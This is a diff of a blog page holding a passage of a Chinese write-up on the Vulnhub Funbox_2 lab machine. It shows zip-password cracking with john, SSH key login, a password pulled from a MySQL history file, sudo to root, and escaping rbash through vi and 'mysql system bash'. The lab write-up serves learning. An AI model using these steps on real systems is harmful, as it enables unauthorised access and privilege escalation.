+<span class="token number">4</span>. get .@users  <span class="token comment"># 下载隐藏文件</span>
+<span class="token number">5</span>. get .@admins <span class="token comment"># 下载隐藏文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
+<p>首先查看welcome.msg, .@users, .@admins <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>m1ku㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/funbox2<span class="token punctuation">]</span>
+└─$ <span class="token function">cat</span> welcome.msg                                                                                                                                               <span class="token number">82</span> ⨯
+Welcome, archive user %U@%R <span class="token operator">!</span>
+
+The <span class="token builtin class-name">local</span> <span class="token function">time</span> is: %T
+
+This is an experimental FTP server.  If you have any unusual problems,
+please report them via e-mail to <span class="token operator">&lt;</span>root@%L<span class="token operator">></span>.
+
+┌──<span class="token punctuation">(</span>m1ku㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/funbox2<span class="token punctuation">]</span>
+└─$ <span class="token function">cat</span> .@users                                                                                                                                                    <span class="token number">1</span> ⨯
+Hi Users,
+
+be carefull with your keys. Find them <span class="token keyword">in</span> %yourname%.zip.
+The passwords are the old ones.
+
+Regards
+root
+
+┌──<span class="token punctuation">(</span>m1ku㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/funbox2<span class="token punctuation">]</span>
+└─$ <span class="token function">cat</span> .@admins        
+SGkgQWRtaW5zLAoKYmUgY2FyZWZ1bGwgd2l0aCB5b3VyIGtleXMuIEZpbmQgdGhlbSBpbiAleW91cm5hbWUlLnppcC4KVGhlIHBhc3N3b3JkcyBhcmUgdGhlIG9sZCBvbmVzLgoKUmVnYXJkcwpyb290
+
+
+┌──<span class="token punctuation">(</span>m1ku㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/funbox2<span class="token punctuation">]</span>
+└─$ <span class="token builtin class-name">echo</span> -n <span class="token string">"SGkgQWRtaW5zLAoKYmUgY2FyZWZ1bGwgd2l0aCB5b3VyIGtleXMuIEZpbmQgdGhlbSBpbiAleW91cm5hbWUlLnppcC4KVGhlIHBhc3N3b3JkcyBhcmUgdGhlIG9sZCBvbmVzLgoKUmVnYXJkcwpyb290"</span><span class="token operator">|</span>base64 -d
+Hi Admins,
+
+be carefull with your keys. Find them <span class="token keyword">in</span> %yourname%.zip.
+The passwords are the old ones.
+
+Regards
+root<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
 <p>从这些信息中得知，这些压缩文件里面存放的是对应用户/root的登录key，并且这些压缩文件的加密密码都比较老</p>
-<p>尝试解压，可以发现里面的内容是id_rda，也就是可以ssh公钥认证登录 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(m1ku㉿kali)-[~/funbox2]</span><br><span class="line">└─$ unzip anna.zip              </span><br><span class="line">Archive:  anna.zip</span><br><span class="line">[anna.zip] id_rsa password: </span><br></pre></td></tr></table></figure></p>
-<p>接下来使用john进行暴力破解： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zip2john anna.zip &gt; anna</span><br><span class="line">john anna --wordlist=../rockyou.txt</span><br></pre></td></tr></table></figure></p>
-<p>在对所有的压缩文件进行破解后，只有两个可以被破解 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cathrine.zip -&gt; catwoman</span><br><span class="line">tom.zip      -&gt; iubire</span><br></pre></td></tr></table></figure></p>
-<p>两个解压得到的id_rda内容是一样的，接下来尝试用cathrine和tom进行ssh登录，发现只有tom能够登录 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh tom@10.0.2.32 -i id_rsa</span><br></pre></td></tr></table></figure></p>
+<p>尝试解压，可以发现里面的内容是id_rda，也就是可以ssh公钥认证登录 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>m1ku㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/funbox2<span class="token punctuation">]</span>
+└─$ <span class="token function">unzip</span> anna.zip              
+Archive:  anna.zip
+<span class="token punctuation">[</span>anna.zip<span class="token punctuation">]</span> id_rsa password: <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></p>
+<p>接下来使用john进行暴力破解： <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">zip2john anna.zip <span class="token operator">></span> anna
+john anna --wordlist<span class="token operator">=</span><span class="token punctuation">..</span>/rockyou.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p>
+<p>在对所有的压缩文件进行破解后，只有两个可以被破解 <pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">cathrine.zip -> catwoman
+tom.zip      -> iubire<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p>
+<p>两个解压得到的id_rda内容是一样的，接下来尝试用cathrine和tom进行ssh登录，发现只有tom能够登录 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> tom@10.0.2.32 -i id_rsa<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220508103627.png" /></p>
 <h2 id="权限提升">2.4. 权限提升</h2>
-<p>登录tom之后进行信息收集，在/home/tom中的.mysql_history中发现了疑似tom的密码的字段 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">_HiStOrY_V2_</span><br><span class="line">show\040databases;</span><br><span class="line">quit</span><br><span class="line">create\040database\040&#x27;support&#x27;;</span><br><span class="line">create\040database\040support;</span><br><span class="line">use\040support</span><br><span class="line">create\040table\040users;</span><br><span class="line">show\040tables</span><br><span class="line">;</span><br><span class="line">select\040*\040from\040support</span><br><span class="line">;</span><br><span class="line">show\040tables;</span><br><span class="line">select\040*\040from\040support;</span><br><span class="line">insert\040into\040support\040(tom,\040xx11yy22!);</span><br><span class="line">quit</span><br></pre></td></tr></table></figure></p>
+<p>登录tom之后进行信息收集，在/home/tom中的.mysql_history中发现了疑似tom的密码的字段 <pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">_HiStOrY_V2_
+show\040databases;
+quit
+create\040database\040'support';
+create\040database\040support;
+use\040support
+create\040table\040users;
+show\040tables
+;
+select\040*\040from\040support
+;
+show\040tables;
+select\040*\040from\040support;
+insert\040into\040support\040(tom,\040xx11yy22!);
+quit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
 <p>其中<code>\040</code>应该是空格，xx11yy22! 怀疑是tom的密码。</p>
 <p>尝试sudo -l，输入上述字符串，成功执行，果然是密码</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220508103920.png" /></p>
-<p>并且tom可以使用sudo执行所有命令，直接切换成root <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo su 或者 su root</span><br></pre></td></tr></table></figure></p>
-<p>直接读取flag <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@funbox2:~<span class="comment"># cat flag.txt</span></span><br><span class="line">   ____  __  __   _  __   ___   ____    _  __             ___ </span><br><span class="line">  / __/ / / / /  / |/ /  / _ ) / __ \  | |/_/            |_  |</span><br><span class="line"> / _/  / /_/ /  /    /  / _  |/ /_/ / _&gt;  &lt;             / __/ </span><br><span class="line">/_/    \____/  /_/|_/  /____/ \____/ /_/|_|       __   /____/ </span><br><span class="line">           ____ ___  ___  / /_ ___  ___/ /       / /          </span><br><span class="line"> _  _  _  / __// _ \/ _ \/ __// -_)/ _  /       /_/           </span><br><span class="line">(_)(_)(_)/_/   \___/\___/\__/ \__/ \_,_/       (_)            </span><br><span class="line">                                                              </span><br><span class="line">from @0815R2d2 with ♥</span><br></pre></td></tr></table></figure></p>
+<p>并且tom可以使用sudo执行所有命令，直接切换成root <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">su</span> 或者 <span class="token function">su</span> root<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>直接读取flag <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@funbox2:~<span class="token comment"># cat flag.txt</span>
+   ____  __  __   _  __   ___   ____    _  __             ___ 
+  / __/ / / / /  / <span class="token operator">|</span>/ /  / _ <span class="token punctuation">)</span> / __ <span class="token punctuation">\</span>  <span class="token operator">|</span> <span class="token operator">|</span>/_/            <span class="token operator">|</span>_  <span class="token operator">|</span>
+ / _/  / /_/ /  /    /  / _  <span class="token operator">|</span>/ /_/ / _<span class="token operator">></span>  <span class="token operator">&lt;</span>             / __/ 
+/_/    <span class="token punctuation">\</span>____/  /_/<span class="token operator">|</span>_/  /____/ <span class="token punctuation">\</span>____/ /_/<span class="token operator">|</span>_<span class="token operator">|</span>       __   /____/ 
+           ____ ___  ___  / /_ ___  ___/ /       / /          
+ _  _  _  / __// _ <span class="token punctuation">\</span>/ _ <span class="token punctuation">\</span>/ __// -_<span class="token punctuation">)</span>/ _  /       /_/           
+<span class="token punctuation">(</span>_<span class="token punctuation">)</span><span class="token punctuation">(</span>_<span class="token punctuation">)</span><span class="token punctuation">(</span>_<span class="token punctuation">)</span>/_/   <span class="token punctuation">\</span>___/<span class="token punctuation">\</span>___/<span class="token punctuation">\</span>__/ <span class="token punctuation">\</span>__/ <span class="token punctuation">\</span>_,_/       <span class="token punctuation">(</span>_<span class="token punctuation">)</span>            
+                                                              
+from @0815R2d2 with ♥<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
 <h3 id="rbash逃逸">2.4.1. rbash逃逸</h3>
 <p>参考文章：<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1680551">RBash - 受限的Bash绕过 - 云+社区 - 腾讯云</a></p>
-<p>其实我在使用LinEnum.sh进行信息收集的时候出现了错误，当我执行该文件的时候 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tom@funbox2:~$ ./LinEnum.sh </span><br><span class="line">-rbash: ./LinEnum.sh: restricted: cannot specify `/<span class="string">&#x27; in command names</span></span><br></pre></td></tr></table></figure></p>
-<p>注意前面的rbash，我去搜索了一下，发现这是受限制的bash，无法执行一些命令。因此根据参考文章绕过，直接使用vi绕过。 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi</span><br></pre></td></tr></table></figure></p>
+<p>其实我在使用LinEnum.sh进行信息收集的时候出现了错误，当我执行该文件的时候 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tom@funbox2:~$ ./LinEnum.sh 
+-rbash: ./LinEnum.sh: restricted: cannot specify `/' <span class="token keyword">in</span> <span class="token builtin class-name">command</span> names<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p>
+<p>注意前面的rbash，我去搜索了一下，发现这是受限制的bash，无法执行一些命令。因此根据参考文章绕过，直接使用vi绕过。 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vi</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220508104504.png" /></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220508104518.png" /></p>
 <p>然后就成功绕过了。</p>
 <p>这里介绍另一种参考文章没介绍的，利用mysql。</p>
-<p>首先使用sudo权限登录mysql，然后利用mysql执行系统命令，生成一个新的shell进程 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">tom@funbox2:~$ sudo mysql -u tom -p</span><br><span class="line">Enter password: </span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 4</span><br><span class="line">Server version: 5.7.30-0ubuntu0.18.04.1 (Ubuntu)</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type <span class="string">&#x27;help;&#x27;</span> or <span class="string">&#x27;\h&#x27;</span> <span class="keyword">for</span> <span class="built_in">help</span>. Type <span class="string">&#x27;\c&#x27;</span> to clear the current input statement.</span><br><span class="line"></span><br><span class="line">mysql&gt; system bash</span><br><span class="line">root@funbox2:~<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure></p>
+<p>首先使用sudo权限登录mysql，然后利用mysql执行系统命令，生成一个新的shell进程 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tom@funbox2:~$ <span class="token function">sudo</span> mysql -u tom -p
+Enter password: 
+Welcome to the MySQL monitor.  Commands end with <span class="token punctuation">;</span> or <span class="token punctuation">\</span>g.
+Your MySQL connection <span class="token function">id</span> is <span class="token number">4</span>
+Server version: <span class="token number">5.7</span>.30-0ubuntu0.18.04.1 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span>
+
+Copyright <span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token number">2000</span>, <span class="token number">2020</span>, Oracle and/or its affiliates. All rights reserved.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type <span class="token string">'help;'</span> or <span class="token string">'\h'</span> <span class="token keyword">for</span> help. Type <span class="token string">'\c'</span> to <span class="token function">clear</span> the current input statement.
+
+mysql<span class="token operator">></span> system <span class="token function">bash</span>
+root@funbox2:~<span class="token comment"># id</span>
+<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
 <p>这样子不仅绕过了rbash，还顺便提权了，哈哈哈哈哈哈哈。</p>
 <h3 id="番外">2.4.2. 番外</h3>
 <p>提权还可以使用对Ubuntu专用漏洞——CVE-2021-3493，测试可行。</p>
 <h1 id="总结">3. 总结</h1>
 <p>该靶机难度较简单，但还是学到了新的知识点：rbash逃逸。</p>
 
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
+        </div>
     </div>
 
-    
-    
-    
 
-    <footer class="post-footer">
-          <div class="post-tags">
-              <a href="/tags/%E7%BB%BC%E5%90%88/" rel="tag"># 综合</a>
-              <a href="/tags/vulnhub/" rel="tag"># vulnhub</a>
-              <a href="/tags/rbash%E9%80%83%E9%80%B8/" rel="tag"># rbash逃逸</a>
-              <a href="/tags/zip%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/" rel="tag"># zip密码爆破</a>
-          </div>
 
         
+          <div id="footer-post-container">
+  <div id="footer-post">
 
-          <div class="post-nav">
-            <div class="post-nav-item">
-                <a href="/2022/05/08/30%20Vulnhub%20Vegeta%20Writeup/" rel="prev" title="30 Vulnhub Vegeta Writeup">
-                  <i class="fa fa-chevron-left"></i> 30 Vulnhub Vegeta Writeup
-                </a>
-            </div>
-            <div class="post-nav-item">
-                <a href="/2022/05/08/29%20Vulnhub%20Dawn%20Writeup%20%E2%AD%90/" rel="next" title="29 Vulnhub Dawn Writeup ⭐">
-                  29 Vulnhub Dawn Writeup ⭐ <i class="fa fa-chevron-right"></i>
-                </a>
-            </div>
-          </div>
-    </footer>
-  </article>
-</div>
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/tags/">标签</a></li>
+         
+          <li><a href="/categories/">分类</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
 
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text">1. 靶机信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B8%97%E9%80%8F"><span class="toc-number">2.</span> <span class="toc-text">2. 渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0"><span class="toc-number">2.1.</span> <span class="toc-text">2.1. 主机发现、端口扫描、端口服务发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#http%E6%9C%8D%E5%8A%A1"><span class="toc-number">2.2.</span> <span class="toc-text">2.2. http服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#get-shell"><span class="toc-number">2.3.</span> <span class="toc-text">2.3. get shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">2.4.</span> <span class="toc-text">2.4. 权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#rbash%E9%80%83%E9%80%B8"><span class="toc-number">2.4.1.</span> <span class="toc-text">2.4.1. rbash逃逸</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%95%AA%E5%A4%96"><span class="toc-number">2.4.2.</span> <span class="toc-text">2.4.2. 番外</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">3.</span> <span class="toc-text">3. 总结</span></a></li></ol>
+    </div>
 
-
-
-
-
-    
-  <div class="comments" id="disqus_thread">
-    <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
-  </div>
-  
-</div>
-  </main>
-
-  <footer class="footer">
-    <div class="footer-inner">
-
-
-<div class="copyright">
-  &copy; 
-  <span itemprop="copyrightYear">2022</span>
-  <span class="with-love">
-    <i class="fa fa-heart"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">hdfzzf</span>
-</div>
-<div class="wordcount">
-  <span class="post-meta-item">
-    <span class="post-meta-item-icon">
-      <i class="fa fa-chart-line"></i>
-    </span>
-      <span>站点总字数：</span>
-    <span title="站点总字数">534k</span>
-  </span>
-  <span class="post-meta-item">
-    <span class="post-meta-item-icon">
-      <i class="fa fa-coffee"></i>
-    </span>
-      <span>站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">8:05</span>
-  </span>
-</div>
-<div class="busuanzi-count">
-</div>
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hdfzzf.github.io/2022/05/08/28%20Vulnhub%20Funbox_2%20Writeup/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hdfzzf.github.io/2022/05/08/28%20Vulnhub%20Funbox_2%20Writeup/&text=28 Vulnhub Funbox_2 Writeup"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hdfzzf.github.io/2022/05/08/28%20Vulnhub%20Funbox_2%20Writeup/&title=28 Vulnhub Funbox_2 Writeup"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hdfzzf.github.io/2022/05/08/28%20Vulnhub%20Funbox_2%20Writeup/&is_video=false&description=28 Vulnhub Funbox_2 Writeup"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=28 Vulnhub Funbox_2 Writeup&body=Check out this article: https://hdfzzf.github.io/2022/05/08/28%20Vulnhub%20Funbox_2%20Writeup/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hdfzzf.github.io/2022/05/08/28%20Vulnhub%20Funbox_2%20Writeup/&title=28 Vulnhub Funbox_2 Writeup"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hdfzzf.github.io/2022/05/08/28%20Vulnhub%20Funbox_2%20Writeup/&title=28 Vulnhub Funbox_2 Writeup"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hdfzzf.github.io/2022/05/08/28%20Vulnhub%20Funbox_2%20Writeup/&title=28 Vulnhub Funbox_2 Writeup"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hdfzzf.github.io/2022/05/08/28%20Vulnhub%20Funbox_2%20Writeup/&title=28 Vulnhub Funbox_2 Writeup"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hdfzzf.github.io/2022/05/08/28%20Vulnhub%20Funbox_2%20Writeup/&name=28 Vulnhub Funbox_2 Writeup&description=&lt;p&gt;该靶机难度较简单。&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hdfzzf.github.io/2022/05/08/28%20Vulnhub%20Funbox_2%20Writeup/&t=28 Vulnhub Funbox_2 Writeup"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
 
     </div>
-  </footer>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2022
+    hdfzzf
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
 
   
-  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
-<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
-
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
   
-<script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
-<script src="/js/third-party/search/local-search.js"></script>
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
 
 
+<script src="/js/main.js"></script>
 
+<!-- search -->
 
+<!-- Google Analytics -->
 
-  
-  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<!-- Baidu Analytics -->
 
+<!-- Cloudflare Analytics -->
 
+<!-- Umami Analytics -->
 
+<!-- Disqus Comments -->
 
-  
+    <script type="text/javascript">
+        var disqus_shortname = 'cactus-1';
 
-  <script class="next-config" data-name="enableMath" type="application/json">false</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"https://cdn.jsdelivr.net/npm/mathjax@3.2.0/es5/tex-mml-chtml.js","integrity":"sha256-r+3itOMtGGjap0x+10hu6jW/gZCzxHsoKrOd7gyRSGY="}}</script>
-<script src="/js/third-party/math/mathjax.js"></script>
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
 
-
-<script class="next-config" data-name="disqus" type="application/json">{"enable":true,"shortname":"hdfzzf","count":true,"i18n":{"disqus":"disqus"}}</script>
-<script src="/js/third-party/comments/disqus.js"></script>
+<!-- utterances Comments -->
 
 </body>
 </html>
